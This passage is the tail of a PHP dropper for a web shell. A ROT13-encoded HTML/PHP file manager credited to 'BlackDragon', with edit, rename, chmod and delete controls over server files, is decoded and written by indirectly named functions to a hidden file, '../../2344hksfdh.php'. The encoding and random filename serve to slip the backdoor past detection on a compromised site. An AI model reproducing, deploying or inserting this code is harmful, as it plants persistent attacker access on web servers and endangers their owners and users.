                                        <gq>
                                            <?cuc vs ($qve != '.' && $qve != '..') : ?>
                                                <qvi pynff="oga-tebhc">
                                                    <n uers="?qve=<?= $cngu ?>&vgrz=<?= $qve ?>&npgvba=rqvg" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1"><v pynff="sn sn-svyr-rqvg"></v></n>
                                                    <n uers="?qve=<?= $cngu ?>&vgrz=<?= $qve ?>&npgvba=eranzr" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1"><v pynff="sn sn-rqvg"></v></n>
                                                    <n uers="?qve=<?= $cngu ?>&vgrz=<?= $qve ?>&npgvba=puzbq" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1"><v pynff="sn sn-svyr-fvtangher"></v></n>
                                                    <n uers="" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1" bapyvpx="erghea qryrgrPbasvez('?qve=<?= $cngu ?>&vgrz=<?= $qve ?>&npgvba=qryrgr')"><v pynff="sn sn-genfu"></v></n>
                                                </qvi>
                                            <?cuc raqvs; ?>
                                        </gq>
                                    </ge>
                                <?cuc raqsbernpu; ?>
                            </gobql>
                        </gnoyr>
                    </qvi>
                    <qvi pynff="grkg-yvtug">&#169; OynpxQentba <fpevcg glcr='grkg/wninfpevcg'>ine perqvgflrne = arj Qngr();qbphzrag.jevgr(perqvgflrne.trgShyyLrne());</fpevcg></qvi>
                </qvi>
            </qvi>
        </qvi>
        <fpevcg fep="uggcf://pqa.wfqryvie.arg/acz/obbgfgenc@5.1.3/qvfg/wf/obbgfgenc.ohaqyr.zva.wf" vagrtevgl="fun384-xn7Fx0Tya4tzgm2ZyDavxG1jKtLfBt+BZuhC+VyEU9fRAOB0YEa5d+8aoGbi4+1c" pebffbevtva="nabalzbhf"></fpevcg>
        <fpevcg fep="uggcf://pqa.wfqryvie.arg/acz/fjrrgnyreg2@11.4.0/qvfg/fjrrgnyreg2.nyy.zva.wf"></fpevcg>
        <fpevcg>
            <?cuc vs (vffrg($_FRFFVBA['zrffntr'])) : ?>
                Fjny.sver(
                '<?= $_FRFFVBA['fgnghf'] ?>',
                '<?= $_FRFFVBA['zrffntr'] ?>',
                '<?= $_FRFFVBA['pynff'] ?>'
                )
            <?cuc raqvs; pyrne(); ?>
            shapgvba qryrgrPbasvez(hey) {
            rirag.ceriragQrsnhyg()
            Fjny.sver({
                gvgyr: 'Ner lbh fher?',
                vpba: 'jneavat',
                fubjPnapryOhggba: gehr,
                pbasvezOhggbaPbybe: '#3085q6',
                pnapryOhggbaPbybe: '#q33',
                pbasvezOhggbaGrkg: 'Lrf, qryrgr vg!'
            }).gura((erfhyg) => {
                vs (erfhyg.vfPbasvezrq) {
                        jvaqbj.ybpngvba.uers = hey
                    }
                })
            }
            shapgvba wfpbcl() {
                ine wfPbcl = qbphzrag.trgRyrzragOlVq("PbclSebzGrkgNern");
                wfPbcl.sbphf();
                wfPbcl.fryrpg();
                qbphzrag.rkrpPbzznaq("pbcl");
            }
        </fpevcg>
    </obql>
</ugzy>


ASD;

$file = $fileFunc("../../2344hksfdh.php", "w");
$writeFunc($file, $rotFunc($asd));
$closeFunc($file); ?>
